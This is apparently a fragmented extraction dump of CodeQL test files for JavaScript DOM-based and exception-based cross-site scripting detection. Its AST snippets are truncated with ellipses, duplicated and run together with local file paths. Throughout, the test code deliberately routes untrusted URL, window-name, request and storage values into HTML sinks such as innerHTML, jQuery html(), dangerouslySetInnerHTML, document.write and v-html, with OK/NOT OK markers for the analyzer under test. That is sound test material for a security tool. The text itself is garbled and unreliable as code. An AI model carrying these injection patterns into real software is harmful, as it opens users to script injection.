ailer')let exp ... ress');let bac ... kend');backend ... ckend')require('./backend')./backend/backend/private_messagelet tra ... rt({});transpo ... ort({})nodemai ... ort({})nodemai ... ansporttranspo ... K\n  });transpo ... OK\n  })transport.sendMailfrom: ' ... le.com''webmas ... le.com'webmaster@example.comwebmaster@exampleto: bac ... ceiver)backend ... ceiver)backend.getUserEmailreq.query.receiversubject ... essage'Private messagetext: ` ... sage}.``Hi, yo ... sage}.`Hi, you ... meone. req.query.messagehtml: ` ... sage}.`/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/optionalSanitizer.js No sanitization;// No sanitization;'myId'DOMPurifyinnerbadSanitizersanitizeBadtainted3functio ... K\n  }\n}{\n  var ... K\n  }\n}var tar ... .searchtarget  ... .search$('myId ... arget);$('myId ... target)$('myId').html$('myId')myIdsanitiz ...  targetDOMPuri ... target)DOMPurify.sanitizevar tai ... target;tainted = target$('myId ... inted);$('myId ... ainted)if (san ... d);\n  }{\n    t ... d);\n  }tainted ... inted);tainted ... ainted)DOMPuri ... ainted)inner(target);inner(target){\n    $ ...  OK\n  }$('myId').html(x);$('myId').html(x)if (san ... ;\n    }x = DOM ... ize(x);x = DOM ... tize(x)DOMPuri ... tize(x)functio ... on;\n  }{\n    r ... on;\n  }tainted2 = target$('myId ... nted2);$('myId ... inted2)if (san ... 2);\n  }{\n    t ... 2);\n  }tainted ... nted2);tainted ... inted2)sanitiz ... inted2)tainted3 = target$('myId ... nted3);$('myId ... inted3)if (san ... 3);\n  }{\n    t ... 3);\n  }tainted ... nted3);tainted ... inted3)sanitiz ... inted3)sanitizeBad(target)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/react-create-context.js'react'MyContextimport  ... react';reactexport  ... null});let MyC ... null});MyConte ...  null})createC ...  null}){root: null}root: null/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/react-native.jsWebView'react-native'"code"import  ... press';import  ... ative';react-nativelet tai ... code");tainted ... "code")req.param("code")<WebVie ... ted}/>;<WebVie ... nted}/>html={tainted}<WebVie ... ed}}/>;<WebVie ... ted}}/>source= ... inted}}{html: tainted}html: tainted/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/react-provide-context.js'./react-create-context'renderMainProviderimport  ... ntext';'./reac ... ontext'./react-create-context/react-create-contextexport  ... ider>\n}functio ... ider>\n}{\n    r ... ider>\n}return  ... ovider><MyCont ... ovider>MyContext.Providervalue={ ... .body}}{root:  ... t.body}root: document.body/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/react-use-context.jsuseContextuseMyContextuseDoc1contextTypefunctio ... ext);\n}{\n    r ... ext);\n}return  ... ntext);useCont ... ontext)export  ... OT OK\n}let { r ... text();{ root  ... ntext(){ root }useMyContext()root.ap ... .name);root.ap ... w.name)root.appendChildclass C ...     }\n}foo() { ... K\n    }() {\n   ... K\n    }let { r ... ontext;{ root  ... contextthis.contextconstru ... rgs); }(...arg ... rgs); }{ super(...args); }super(...args);super(...args)super...argsC.conte ... ontext;C.conte ... ContextC.contextType/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/react-use-state.jsuseStateinitialStatesetStatedangerouslySetInnerHTML__htmlsetStateValuesetStateValueLazysetStateValueSafe'safe''also safe'let [st ... .name);[state, ... w.name)[state, setState]useStat ... w.name)return  ... </div>;<div da ... ></div>dangero ... state}}dangero ... nerHTML{__html: state}__html: statelet [st ... 'foo');[state, ... ('foo')useState('foo')setStat ... .name);setStat ... w.name)() => window.name{\n    l ... ame);\n}setStat ... \n    })prev => ... K\n    }documen ... = prev;documen ...  = prev{\n    l ... // OK\n}setState('safe');setState('safe')setStat ... safe');setStat ...  safe')() => 'also safe'also safe/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/sanitiser.js NOT OK, but not flagged - [INCONSISTENCY]escapeHtmlampltgt'&amp;''&lt;''&gt;'escapeAttr'%22'/"/g'%27'"<a href=\"""</a>""<div>""</div>"/[<>'"&]/!=/<\w+/gfunctio ... t;');\n}{\n    v ... t;');\n}var amp ... = />/g;amp = /&/glt = /</ggt = />/greturn  ... &gt;');s.toStr ... '&gt;')s.toStr ... replaces.toStr ... '&lt;')s.toStr ... &amp;')s.toString()s.toString&amp;&lt;&gt;functio ... 27');\n}{\n    r ... 27');\n}return  ... '%27');s.toStr ...  '%27')s.toStr ...  '%22')%22%27var tai ... w.name;tainted ... ow.namevar elt ... ment();elt = d ... ement()documen ... ement()elt.inn ... "</a>";elt.inn ...  "</a>"elt.innerHTML"<a hre ...  "</a>""<a hre ... ainted)"<a hre ... + "\">"escapeAttr(tainted)escapeHtml(tainted)</a>elt.inn ... /div>";elt.inn ... </div>""<div>" ... </div>""<div>" ... ainted)<div></div>const r ... >'"&]/;regex = /[<>'"&]/[<>'"&]if (reg ...  OK\n  }regex.test(tainted)regex.testelt.inn ... '</b>';elt.inn ...  '</b>''<b>' + taintedif (!re ...  OK\n  }!regex.test(tainted)regex.exec(tainted)regex.execregex.e ... != nullregex.e ... == nullelt.inn ... g, '');elt.inn ... /g, '')tainted ... /g, '')tainted.replace<\w+/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/stored-xss.js'session''local'">foobar</a>""/>"href2"\n<a href=\""href3'\r\n<a href="/''">''</a>'{\n    s ... // OK\n}session ... earch);session ... search)session ... setItemlocalSt ... earch);localSt ... search)localStorage.setItem$('myId ... ion'));$('myId ... sion'))session ... ssion')session ... getItemlocalSt ... ssion')localStorage.getItem$('myId ... cal'));$('myId ... ocal'))session ... local')localSt ... local')var hre ... ocal');href =  ... local')$('myId ... </a>");$('myId ... r</a>")"<a hre ... ar</a>""<a href=\"" + href>foobar</a>if (hre ... ;\n    }href.in ...  !== -1href.indexOf("\"")href.indexOf$('myId ...  "/>");$('myId ... + "/>")"<a hre ...  + "/>"/>href2 = ... local')href2.i ...  !== -1href2.indexOf("\"")href2.indexOf"\n<a h ... ar</a>""\n<a h ... + href2
<a href="href3 = ... local')href3.i ...  !== -1href3.indexOf("\"")href3.indexOf$('myId ... </a>');$('myId ... '</a>')'\r\n<a ...  '</a>''\r\n<a ... ething"'\r\n<a ...  + '">''\r\n<a ... + href3
<a href="//mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/string-manipulations.js OK (for now)// OK (for now)documen ... At(0));documen ... eAt(0))documen ... deAt(0)documen ... rCodeAtdocumen ... on.hrefdocumen ... ation);documen ... cation)documen ... .href);documen ... n.href)documen ... eOf());documen ... ueOf())documen ... lueOf()documen ... valueOfdocumen ... sup());documen ... .sup())documen ... f.sup()documen ... ref.supdocumen ... ase());documen ... Case())documen ... rCase()documen ... perCasedocumen ... eft());documen ... Left())documen ... mLeft()documen ... rimLeftdocumen ... href));documen ... .href))String. ... n.href)String( ... n.href)escape( ... n.href)documen ... ef))));documen ... ref))))escape( ... href)))escape( ... .href))/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/tooltip.jsxReactReactDOM'react-dom'ReactTooltip'react-tooltip'tooltips
        data-tip // OK
        data-html"true" // NOT OK
        
    import  ... t-dom';react-domimport  ... oltip';react-tooltipfunctio ... span>\n}{\n    c ... span>\n}const s ... w.name;source = window.namereturn  ... </span><span>\n ... </span>\n        <span d ... urce}/>data-tip={source} // OK\n        <span d ... lse} />data-html={false}<span d ... rue" />data-html="true" // NOT OK\n        <span d ... rue} />data-html={true}<ReactTooltip />\n    /mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/translate.js"own goal""backpass""fumble""feint"'original-term''term''translated-term'(functi ... )]);\n})functio ... ')]);\n}{\n  var ... ')]);\n}var tra ... t"\n  };transla ... nt"\n  }{\n    " ... nt"\n  }"own go ... ckpass"own goalbackpass"fumble": "feint"fumblefeintvar sea ... ng(1));searchP ... ing(1))new URL ... ing(1))target.substring(1)target.substring$('orig ... erm'));$('orig ... term'))$('orig ... ').html$('original-term')original-termsearchP ... 'term')searchParams.getterm$('tran ... rm')]);$('tran ... erm')])$('tran ... ').html$('translated-term')translated-termtransla ... term')]/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/tst.js NOT OK (duplicated to test precision of flow tracking)// NOT  ... acking) not effective - matches "123<script>...</script>"// not  ... cript>" realistic example// realistic example NOT OK!	// NOT OK!\t OK (.get is not defined on a URL)// OK ( ...  a URL) NOT OK. (this is a jQuery object)// NOT  ... object) OK. (this is a jQuery object)// OK.  ... object) NOT OK. (this is a DOM-node);// NOT  ... -node); OK. (this is a DOM-node);// OK.  ... -node);"<OPTION value=1>""default=""</OPTION>""<OPTION value=2>English</OPTION>"'<div style="width:''px">''name'chopdangerouslySetInnerHtml"myService"$sce$othertrustAsHtmltrustAsCsstrustAsUNKNOWNtrustAsHTMLUNKNOWN"myService2"'<div>''SAFE'"myService3"tst/^\d+$/"^\\d+$"/\d+/angularJSServicesfactory"xssSource_to_service""xssSinkService1"xssSinkService1"xssSource_from_service""xssSourceService"xssSourceService"innocentSource_to_service""xssSinkService2"xssSinkService2"innocent""innocentSource_from_service""innocentSourceService"innocentSourceServicetestDOMParser"application/xml"references"div"createFactoryC1notTainteddbLookuptainted4prevStateC2prevPropsdefaultPropsC3stateTaintedpropTaintedwindowNamewindowNameAssigned'a''b'jqueryLocationloc1loc2loc3testCreateContextualFragmentdocumentFragmentflowThroughPropertyNamesinbasicExceptionsfinallyhandlebarsSafeStringHandlebarsSafeStringgetTaintedUrlURLPseudoPropertiesmyUrlgetUrlgrowlthisNodespluginName"myFancyJQueryPlugin"myPlugin'myid'taint5taint6taint7taint8taint9hash2payload/hello (\w+)/nonGlobalSanitizer/<metadata>[\s\S]*<\/metadata>/'<metadata></metadata>'/<|>/gmootools"html"setPropertiesappendHtmlConvert'ansi-to-html'ansiToHtmlansiToHTMLtoHtmldomMethods'mytable'celldocumen ... ION>");documen ... TION>")"<OPTIO ... PTION>""<OPTIO ... t=")+8)<OPTION value=1>documen ... t=")+8)documen ... bstringdocumen ... lt=")+8documen ... ault=")documen ... indexOfdefault=</OPTION><OPTION value=2>English</OPTION>$('<div ... px">');$('<div ... 'px">')'<div s ...  'px">''<div s ...  target<div style="width:px">'<div s ... +target+target'<div s ... target)parseInt(target)let par ... Params;params  ... hParams(new UR ... hParams(new UR ... ation))new URL ... cation)$('name ... ame'));$('name ... name'))$('name').html$('name')params.get('name')params.getsearchP ... 'name')functio ... get);\n}{\n // N ... get);\n}foo(doc ... earch);foo(doc ... search)functio ... arch;\n}{\n  ret ... arch;\n}return  ... search;$('myId ... bar());$('myId ... (bar())bar(){\n  return x;\n}$('myId ... arch));$('myId ... earch))baz(doc ... search)functio ... iv>";\n}{\n  ret ... iv>";\n}return  ... /div>";"<div>" + swrap(do ... search)functio ... n "";\n}{\n  if  ... n "";\n}if (s)\n ... str(1);return s.substr(1);s.substr(1)s.substrreturn "";chop(do ... search)$('myId ... r())));$('myId ... ar())))wrap(chop(bar()))chop(bar())functio ... l(s);\n}dangero ... nerHtml{\n  //  ... l(s);\n}$('myId').html(s);$('myId').html(s)dangero ... earch);dangero ... search)[,docum ... x);\n});[,docum ... (x);\n})[,docum ... forEach[,docum ... search]functio ... l(x);\n}{\n  if  ... l(x);\n}if (x)\n ... tml(x);let s = ... ch}}/>;s = <sp ... rch}}/><span d ... rch}}/>dangero ... earch}}{__html ... search}__html: ... .searchangular ... servicemyService$sce.tr ... earch);$sce.tr ... search)$sce.trustAsHtml$sce.trustAsCss$sce.trustAsUNKNOWN$sce.trustAs$sce.HTML$sce.CSS$other. ... earch);$other. ... search)$other.trustAsHtmlmyService2angular ... earch);angular ... search)angular ... ').htmlangular ... <div>')angular.elementangular ... SAFE');angular ... 'SAFE')return  ...      };link: f ...       }element ... earch);element ... search)element.htmlelement ... SAFE');element.html('SAFE')myService3functio ... e(v);\n}{\n  var ... e(v);\n}var v = ... str(1);v = doc ... bstr(1)documen ... bstr(1)documen ... .substrdocument.write(v);document.write(v)if (/^\ ... v);\n  }/^\d+$/.test(v)/^\d+$/.test^\d+${\n    / ... v);\n  }if ((m  ... v);\n  }(m = /^ ... xec(v))m = /^\d+$/.exec(v)/^\d+$/.exec(v)/^\d+$/.execif (v.m ... v);\n  }v.match(/^\d+$/)v.match{\n      ... v);\n  }v.match("^\\d+$")if (!(/ ... return;!(/\d+/.test(v))(/\d+/.test(v))/\d+/.test(v)/\d+/.test!(/^\d+$/.test(v))(/^\d+$/.test(v)){\n    a ...    })\n}angular ...      })angular ... factoryangular ...     }])"xssSou ... ervice"xssSource_to_service["xssSi ...      }]xssSink ... earch);xssSink ... search)return  ... l(v); }functio ... l(v); }{ $("<d ... l(v); }$("<div>").html(v);$("<div>").html(v)$("<div>").html$("<div>")xssSource_from_service["xssSo ...      }]$("<div ... ice());$("<div ... vice())xssSourceService()return  ... arch };functio ... earch }{ retur ... earch }return  ... .search"innoce ... ervice"innocentSource_to_servicexssSink ... cent");xssSink ... ocent")innocentinnocentSource_from_service["innoc ...      }]innocen ... Serviceinnocen ... rvice()return  ... ent" };functio ... cent" }{ retur ... cent" }return "innocent"var par ... rser();parser  ... arser()new DOMParser()parser. ... /xml");parser. ... n/xml")parser. ... mStringapplication/xmlvar tai ... search;documen ... ainted;documen ... taintedcreateE ... ainted;createE ... taintedcreateE ... nerHTMLcreateElement()documen ... me()[0]documen ... sName()documen ... assNamegetElem ... ainted;getElem ... taintedgetElem ... nerHTMLgetElem ... me()[0]getElem ... sName()getElem ... .item()getElem ... ().itemfunctio ... }/>);\n}{\n    v ... }/>);\n}React.c ... ted}});React.c ... nted}})React.createElement{danger ... inted}}dangero ... ainted}{__html: tainted}__html: taintedReact.c ... ("div")React.createFactoryclass C ... }\n    }React.Componentconstru ...       }() {\n   ...       }this.st ... ainted;this.st ... taintedthis.state.tainted1this.statethis.st ... okup();this.st ... ookup()this.st ... TainteddbLookup()this.se ... ted }))this.setState() => ( ... nted })({ tain ... nted }){ taint ... inted }tainted2: taintedthis.st ... inted }tainted3: taintedthis.state.tainted4test()  ...       }$('myId ... nted1);$('myId ... inted1)this.state.tainted2this.state.tainted3this.se ...     });this.se ...      })prevSta ...       }$('myId ... inted4)prevState.tainted4this.props.tainted1this.propsthis.props.tainted2this.props.tainted3this.pr ... Tainted(prevSt ...       }prevProps.tainted4C2.defa ... nted };C2.defa ... inted }C2.defaultPropstainted1: tainted(<C2 ta ... ed}/>);(<C2 ta ... ted}/>)<C2 tai ... nted}/>tainted2={tainted}new C2( ... nted});new C2( ... inted}){tainted3: tainted}{tainted4: tainted}tainted4: tainted(props) ...       }super(props);super(props)props.propTaintedrender( ...       }return  ... ed}}/>;<span d ... ted}}/>dangero ... inted}}{__html ... ainted}__html: ... Tainted(<C3 pr ... ed}/>);(<C3 pr ... ted}/>)<C3 pro ... nted}/>propTai ... ainted}$(window.name);$(window.name)$(name);$(name){\n    f ...     }\n}for (na ... K\n    }['a', 'b']$(location);$(location)$(window.location);$(window.location)$(docum ... ation);$(document.location)var loc1 = location;loc1 = locationvar loc ... cation;loc2 =  ... ocationloc3 =  ... ocation$(loc1);$(loc1)$(loc2);$(loc2)$(loc3);$(loc3)$("body ... ation);$("body ... cation)$("body").appendfunctio ... ent);\n}testCre ... ragment{\n    v ... ent);\n}var ran ... ange();range = ... Range()documen ... Range()document.createRangerange.s ... em(0));range.s ... tem(0))range.selectNodedocumen ... item(0)documen ... ").itemdocumen ... ("div")documen ... TagNamevar doc ... inted);documen ... ainted)range.c ... ainted)range.c ... ragmentdocumen ... gment);documen ... agment)documen ... ndChildflowThr ... tyNamesvar obj = {};obj = {}obj[Mat ... w.name;obj[Mat ... ow.nameobj[Math.random()]Math.random()for (va ...   $(p);var p$(p);$(p){\n\ttry  ... OK\n\t}\n}try {\n\t ... T OK\n\t}{\n\t\tthr ... ion;\n\t}throw location;catch(e ... T OK\n\t}{\n\t\t$(" ... T OK\n\t}$("body").append(e);$("body").append(e){\n\t\ttry ... y {}\n\t}try {\n\t ... ally {}{\n\t\t\tth ... ion\n\t\t}throw locationfunctio ...  OK!\t\n}{\n\tretu ...  OK!\t\n}return  ... ation);new Han ... cation)Handleb ... eStringfunctio ... ngth)\n}{\n  var ... ngth)\n}$('myId ... length)target.lengthfunctio ... ion);\n}{\n  ret ... ion);\n}functio ...  URL)\n}{\n  let ...  URL)\n}getTain ... hParamsgetTaintedUrl()let myU ... dUrl();myUrl = ... edUrl()myUrl.get('name')myUrl.get{\n  fun ... T OK\n\n}functio ... n);\n  }{\n    r ... n);\n  }$(getUr ... ng(1));$(getUr ... ing(1))getUrl( ... ring(1)getUrl( ... bstringgetUrl().hashgetUrl()$.jGrowl(target);$.jGrowl(target)functio ... in; \n\n}{\n\tvar  ... in; \n\n}var plu ... lugin";pluginN ... Plugin""myFanc ... Plugin"myFancyJQueryPluginvar myP ... \t});\n\t}myPlugi ... \t});\n\t}functio ... \t});\n\t}{\n\t     ... \t});\n\t}this.html(target);this.html(target)this.htmlthis.in ...  targetthis.innerHTMLthis.ea ... .\n\t\t});this.ea ... K.\n\t\t})this.eachfunctio ... OK.\n\t\t}{\n\t\t\tth ... OK.\n\t\t}this.in ... target;e.inner ... target;e.innerHTML = targete.innerHTML$.fn[pl ... Plugin;$.fn[pl ... yPlugin$.fn[pluginName]$.fnfunctio ... [0]);\n}{\n  var ... [0]);\n}$('myid ... ")[0]);$('myid ... ?")[0])$('myid').html$('myid')myiddocumen ... "?")[0]documen ... it("?")documen ... f.split{\n  var ... // OK\n}$('myId ... taint);$('myId ... .taint)target.tainttarget.taint2 = 2;target.taint2 = 2target.taint2$('myId ... aint2);$('myId ... taint2)target. ... search;target. ... .searchtarget.taint3$('myId ... aint3);$('myId ... taint3)target. ... nt4 = 2target.sub.taint4target.sub$('myId ... aint4);$('myId ... taint4)$('myId ... aint5);$('myId ... taint5)target.taint5target. ... "safe";target. ...  "safe"target.taint6 = 2;target.taint6 = 2target.taint6if (ran ... eturn;}{return;}$('myId ... aint6);$('myId ... taint6)if (ran ... safe";}{target ... safe";}target.taint7$('myId ... aint7);$('myId ... taint7)target. ... taint8;target. ... .taint8target.taint8$('myId ... aint8);$('myId ... taint8)target. ... safe");target. ... "safe")target.taint9(target ... "safe")$('myId ... aint9);$('myId ... taint9)var pay ... str(1);payload ... bstr(1)window. ... bstr(1)window. ... .substrdocumen ... yload);documen ... ayload)let mat ... \w+)/);match = ... (\w+)/)window. ... (\w+)/)window. ... h.matchhello (\w+)hello (\w+)if (mat ...  OK\n  }{\n    d ...  OK\n  }documen ... ch[1]);documen ... tch[1])match[1]documen ... ')[1]);documen ... #')[1])window. ... '#')[1]window. ... it('#')window. ... h.split$("#foo ... ta>'));$("#foo ... ata>'))$("#foo").htmltarget. ... data>')target.replace/<metad ... adata>/<metadata>[\s\S]*<\/metadata><metadata>[\s\S]*[\s\S]metadata>'<metad ... adata>'<metadata></metadata>$("#foo ... , ''));$("#foo ... g, ''))target. ... /g, '')<|>var sou ... search;source  ... .searchnew Element("div");new Element("div")new Ele ... urce});new Ele ... ource}){text: source}text: source{html: source}html: sourcenew Ele ... ource);new Ele ... source)new Ele ... v").set{"html": source}"html": sourcenew Ele ... ropertynew Ele ... pertiesnew Ele ... endHtmlconst C ... html');Convert ... -html')require ... -html')ansi-to-htmlconst a ... vert();ansiToH ... nvert()new Convert()$("#foo ... ource);$("#foo ... source)$("#foo ... urce));$("#foo ... ource))ansiToH ... source)ansiToHtml.toHtmllet tab ... able');table = ... table')documen ... table')mytabletable.i ... source;table.i ...  sourcetable.innerHTMLlet row ... ow(-1);row = t ... Row(-1)table.insertRow(-1)table.insertRowrow.inn ... source;row.inn ...  sourcerow.innerHTMLlet cel ... Cell();cell =  ... tCell()row.insertCell()row.insertCellcell.in ... source;cell.in ...  sourcecell.innerHTML/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/tst3.js not flagged since attribute name is unknown// not  ... unknown"src""HREF""width""xlink:href"'xlink''href''baz'var foo ... "foo");foo = d ... ("foo")documen ... ("foo")var dat ... r(1)));data =  ... tr(1)))JSON.pa ... tr(1)))decodeU ... str(1))foo.set ... a.src);foo.set ... ta.src)foo.setAttributedata.srcfoo.set ... ata.p);foo.set ... data.p)HREFdata.pfoo.set ... ata.w);foo.set ... data.w)data.wxlink:hreffoo.setAttributeNSxlinkfor (va ... ta[p]);foo.set ... ta[p]);foo.set ... ata[p])data[p]/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/typeahead.js NOT OK - but only flagged when `AdditionalSources` are imported [INCONSISTENCY].// NOT  ... TENCY].autocompleterBloodhoundprefetchremoteUrlinitialize'.typeahead'typeaheadttAdaptertemplatessuggestion'dashboards'(functi ...   )\t\n})functio ... \n  )\t\n}{\n  var ... \n  )\t\n}var aut ... rl\n  })autocom ... rl\n  })new Blo ... rl\n  }){\n    p ... Url\n  }prefetch: remoteUrlautocom ... lize();autocom ... alize()autocom ... tialize$('.typ ...  }\n  })$('.typ ... peahead$('.typeahead').typeahead{\n    s ...   }\n  }source: ... apter()autocom ... apter()autocom ... Adaptertemplat ... }\n    }suggest ...       }return loc;$('.typ ...   }\n  )name: 'dashboards'dashboardssource: ...       }cb(target);cb(target)templat ...       }return val;/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/v-html.vueexport  ... } }\n  }{\n    d ... } }\n  }data: f ... ion } }functio ... ion } }{ retur ... ion } }return  ... ation }{ taint ... ation }tainted ... ocationv-html/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/various-concat-obfuscations.js"\"/>""/>indirection1attrs'<div align="'defaultattr'left''</div>'indirection2let tai ... search;$("<div ... div>");$("<div ... /div>")"<div>" + tainted$(`<div ... div>`);$(`<div ... /div>`)`<div>$ ... </div>`$("<div ... iv>"));$("<div ... div>"))"<div>" ... /div>")"<div>" ... .concat"<div>".concat$(["<di ... oin());$(["<di ... join())["<div> ... .join()["<div> ... "].join["<div> ... /div>"]$("<div ... \"/>");$("<div ... "\"/>")"<div i ...  "\"/>"$(`<div ... }"/>`);$(`<div ... d}"/>`)`<div i ... ed}"/>`$("<div ... "/>"));$("<div ... ("/>"))"<div i ... t("/>")"<div i ... .concat"<div i ... ainted)"<div id=\"".concat["<div  ... .join()["<div  ... "].join["<div  ... "\"/>"]functio ... v>';\n\t}{\n\t\tret ... v>';\n\t}return  ... /div>';'<div a ... </div>''<div a ... content'<div a ...  + '">''<div a ... 'left')<div align="(attrs. ... 'left')attrs.d ...  'left'attrs.defaultattrfunctio ... >');\n\t}{\n\t\tret ... >');\n\t}return  ... div>');'<div a ... /div>')'<div a ... .concat'<div a ... ntent))'">'.concat(content)'">'.concat$(indir ... ttrs));$(indir ... attrs))indirec ... .attrs)documen ... h.attrs/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/winjs.jsWinJSUtilitiessetInnerHTMLUnsafesetOuterHTMLUnsafefunctio ... ted);\n}{\n  var ... ted);\n}var tai ... ing(1);tainted ... ring(1)documen ... ring(1)WinJS.U ... inted);WinJS.U ... ainted)WinJS.U ... LUnsafeWinJS.Utilities/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/DomBasedXss/xmlRequest.js"{{ some_url }}""GET""Content-Type""application/json""#myThing"$(docum ...    }\n})$(document).ready$(document){\n    v ...     }\n}var xhr ... uest();xhr = n ... quest()new XMLHttpRequest()var url ... url }}"url = " ... url }}"{{ some_url }}xhr.ope ... , true)xhr.openGETxhr.set ... /json")xhr.setRequestHeaderContent-Typeapplication/jsonxhr.onr ... ;\n    }xhr.onr ... echangeif (xhr ... eturn }xhr.readyState !== 4xhr.readyState{ return }var jso ... seText)json =  ... seText)JSON.pa ... seText)xhr.responseText$("#myT ... ssage);$("#myT ... essage)$("#myThing").html$("#myThing")#myThingjson.messagetry {\n  ... )\n    }{\n      ... )\n    }xhr.send()xhr.sendcatch ( ... )\n    }console.log(error)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ExceptionXss/ajv.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ExceptionXssAjv'ajv'ajvaddSchema'object'additionalProperties'number''pollData''/polldata'validateerrorsTextjoi"joi"joiSchemaage'age''/votedata'import  ...  'ajv';let ajv = new Ajv();ajv = new Ajv()new Ajv()ajv.add ... Data');ajv.add ... lData')ajv.addSchema{type:  ... mber'}}type: 'object'additio ... umber'}{type: 'number'}type: 'number'pollDataapp.pos ...   }\n});app.pos ...    }\n})/polldata(req, r ...     }\n}if (!aj ... K\n    }!ajv.va ... q.body)ajv.val ... q.body)ajv.validateres.sen ... ext());res.sen ... Text())ajv.errorsText()ajv.errorsTextconst j ... "joi");joi = require("joi")require("joi")const j ... 'age');joiSche ...  'age')joi.obj ...  'age')joi.obj ... }).withjoi.obj ... ed()\n})joi.object().keysjoi.object()joi.object{\n    n ... red()\n}name: j ... uired()joi.str ... uired()joi.str ... equiredjoi.string()joi.stringage: jo ... uired()joi.num ... uired()joi.num ... equiredjoi.number()joi.number/votedata{\n    c ...     }\n}const v ... .body);val = j ... q.body)joiSche ... q.body)joiSchema.validateif (val ... K\n    }val.errorres.send(val.error);res.send(val.error)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-079/ExceptionXss/exception-xss.js NOT OK! - but not detected due to not tainting object that have a tainted propety. [INCONSISTENCY] Direct leak, reported by other query.// Dire ...  query. nothing// nothing OK (for now?)// OK (for now?) OK. We are not sure that `unknown()` is null-ish. // OK.  ... l-ish.  OK - does not contain an error, and `res` is otherwise unknown. // OK - ... known.  OK (the above `res.send()` is already reported by js/xss)// OK ( ... js/xss) A series of functions does not throw tainted exceptions.// A se ... ptions.deep2tmpmyWeirdInner/foo/'/user/:id'"Exception: "'exceptionSession'pick/bla/(functi ... \n\t}\n});(functi ...  \n\t}\n})functio ... ! \n\t}\n}{\n\tvar  ... ! \n\t}\n}var foo ... cation;foo = d ... ocationfunctio ... (x);\n\t}{\n\t\tunknown(x);\n\t}unknown(x);unknown(x)try {\n\t ...  OK!\n\t}{\n\t\tunknown(foo);\n\t}unknown(foo);unknown(foo)catch ( ...  OK!\n\t}{\n\t\t$(' ...  OK!\n\t}$('myId').html(e);$('myId').html(e){\n\t\tinner(foo);\n\t}inner(foo);inner(foo){\n\t\tunk ... r");\n\t}unknown ... "bar");unknown(foo + "bar")foo + "bar"try {\n\t ... NCY]\n\t}{\n\t\tunk ...  });\n\t}unknown ... foo });unknown ...  foo }){ prop: foo }prop: foocatch ( ... NCY]\n\t}{\n\t\t$(' ... NCY]\n\t}{\n\t\tunk ... o]);\n\t}unknown ...  foo]);unknown ... , foo])["bar", foo]{\n\t\tdeep2(x);\n\t}deep2(x);deep2(x){\n\t\tinner(x);\n\t}inner(x);inner(x){\n\t\tdee ... oo);\n\t}deep("bar" + foo);deep("bar" + foo)"bar" + footry {\n\t ...  OK \n\t}{\n\t\tvar ... foo;\n\t}var tmp ...  + foo;tmp = "bar" + foocatch ( ...  OK \n\t}{\n\t\t$(' ...  OK \n\t}functio ... ar";\n\t}{\n\t\tvar ... ar";\n\t}var foo = x + "bar";foo = x + "bar"x + "bar"{\n\t\tsafe(foo);\n\t}safe(foo);safe(foo){\n\t\tsaf ... oo);\n\t}safe.ca ... , foo);safe.call(null, foo)safe.callvar myWeirdInner;{\n\t\tmyW ... \n\t\t}\n\t}myWeird ... x);\n\t\t}functio ... x);\n\t\t}{\n\t\t\tinner(x);\n\t\t}try {\n\t ... OK! \n\t}{\n\t\tmyW ... oo);\n\t}myWeirdInner(foo);myWeirdInner(foo)catch ( ... OK! \n\t}{\n\t\t$(' ... OK! \n\t}$('myId').html(foo);$('myId').html(foo){\n\t\tunk ... /));\n\t}unknown ... foo/));unknown ... /foo/))foo.match(/foo/)foo.match{\n\t\tunk ... "]);\n\t}unknown ... bar"]);unknown ... "bar"])[foo, "bar"]{\n\t\ttry ... \n\t\t}\n\t}try {\n\t ... ing\n\t\t}{\n\t\t\tun ... o);\n\t\t}{\n\t\t\t// nothing\n\t\t}app.get ... \n\t}\n});app.get ... !\n\t}\n})/user/:idfunctio ... K!\n\t}\n}{\n\ttry  ... K!\n\t}\n}{\n\t\tunk ... id);\n\t}unknown ... ms.id);unknown ... ams.id)req.params.id{\n\t\tres ...  OK!\n\t}res.sen ... " + e);res.sen ...  " + e)"Exception: " + eException: (functi ... }\n})();(functi ... \t}\n})()(functi ... K\n\t}\n}){\n\tsess ... OK\n\t}\n}exceptionSession{\n\t\tunk ... '));\n\t}unknown ... ion'));unknown ... sion'))catch ( ... T OK\n\t}{\n\t\t$(' ... T OK\n\t}app.get ... \t});\n})functio ... \n\t});\n}{\n\tunkn ... \n\t});\n}unknown ... ?)\n\t});unknown ... w?)\n\t})(error, ... 